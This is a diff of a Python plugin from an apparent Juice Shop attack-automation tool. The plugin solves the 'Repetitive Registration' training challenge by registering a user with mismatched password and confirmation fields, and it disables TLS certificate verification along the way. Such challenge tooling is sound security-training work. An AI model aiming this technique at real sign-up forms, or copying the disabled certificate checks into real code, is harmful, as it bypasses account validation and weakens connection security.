@@ -1,14 +1,14 @@
 # SOURCE FILE:    repetitive_registration.py
 # PROGRAM:        JuiceShop automating attack application -- Plugin
 # FUNCTIONS:      Solve REPETITIVE REGISTRATION Challenge
-#                 Enter differet passwords in "password" and "passwordRepeat" field but still can successfullt register. 
-#          
+#                 Enter differet passwords in "password" and "passwordRepeat" field but still can successfullt register.
+#
 # DATE:           Dec 6, 2022
 # REVISIONS:      N/A
 # PROGRAMMER:     Yoyo Wang
 #
 # NOTES
-#--------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------
 
 import time
 from plugins import attack as a
@@ -16,18 +16,20 @@ from plugins import user_generate as usrGen
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-#---------------------------------------------------------------------------------------
+# ---------------------------------------------------------------------------------------
 #Class: repetitive_registration
 #Inherit: Attack
-#--------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------
+
+
 class repetitive_registration(a.attack_inter):
 
-#--------------------------------------------------------------------------------------
-#FUNCTION: __init__ 
-#ARGUMENTS: N/A
-#RETURNS: void
-#Description: Initial class variables
-#--------------------------------------------------------------------------------------
+    # --------------------------------------------------------------------------------------
+    #FUNCTION: __init__
+    #ARGUMENTS: N/A
+    #RETURNS: void
+    # Description: Initial class variables
+    # --------------------------------------------------------------------------------------
     def __init__(self):
         # REST session
         self.juice_session = a.requests.session()
@@ -40,14 +42,14 @@ class repetitive_registration(a.attack_inter):
         # moke user password
         self.password = '123456'
 
-#--------------------------------------------------------------------------------------
-#FUNCTION generator
+# --------------------------------------------------------------------------------------
+# FUNCTION generator
 #ARGUMENTS: N/A
-#RETURNS: json_data  --> will be embedded into POST request json field. 
-#Description: This function is used to generate needed data from REST requests
-#             
-#NOTES:
-#--------------------------------------------------------------------------------------
+# RETURNS: json_data  --> will be embedded into POST request json field.
+# Description: This function is used to generate needed data from REST requests
+#
+# NOTES:
+# --------------------------------------------------------------------------------------
     def generator(self):
         json_data = {
             'email': self.email,
@@ -61,22 +63,32 @@ class repetitive_registration(a.attack_inter):
         }
         return json_data
 
-#--------------------------------------------------------------------------------------
-#FUNCTION run
+# --------------------------------------------------------------------------------------
+# FUNCTION run
 #ARGUMENTS: N/A
 #RETURNS: N/A
-#Description: This is the main function for plugin to send REST requests.
-#             
+# Description: This is the main function for plugin to send REST requests.
+#
 #NOTES: None
-#--------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------
     def run(self):
         print("================Start register a new user==============")
-        a.logging.basicConfig(filename='./test_logging_info.log', 
-                            level=a.logging.INFO, format='%(asctime)s %(message)s')
+        a.logging.basicConfig(filename='./test_logging_info.log',
+                              level=a.logging.INFO, format='%(asctime)s %(message)s')
         a.logging.Formatter.converter = time.gmtime
-        logger = a.logging.getLogger("Repetitive Registration")
-        a.logging.info(logger)
-        a.logging.info('Started')
+
+        #Truncate the last two lines in logging 
+        # as this function calls the SQL injection which caused duplicated logging
+        with open('./test_logging_info.log', 'rb+') as fh:
+            # read an store all lines into list
+            lines = fh.readlines()
+            #move file pointer at the start of a file using the seek() method
+            fh.seek(0)
+            fh.truncate()
+            #write all lines from a file except the last two lines
+            fh.writelines(lines[:-2])
+
+        a.logging.info('#Repetitive Registration Started')
         json_data = self.generator()
         response = a.requests.post(self.url, json=json_data, verify=False)
         print(response.status_code)
@@ -85,16 +97,6 @@ class repetitive_registration(a.attack_inter):
             print("Congratulations! You have successfully finished task Repetitive Registration")
             print("Now you can login with user email " + self.email + " and password " + self.password)
             userid = response.json()["data"]["id"]
-            a.logging.info('Finished')
+            a.logging.info('#Repetitive Registration Finished')
             print("================registration finished==============")
             return self.email, self.password, userid
-        a.logging.info('Finished')
-
-
-
-
-
-
-
-
-
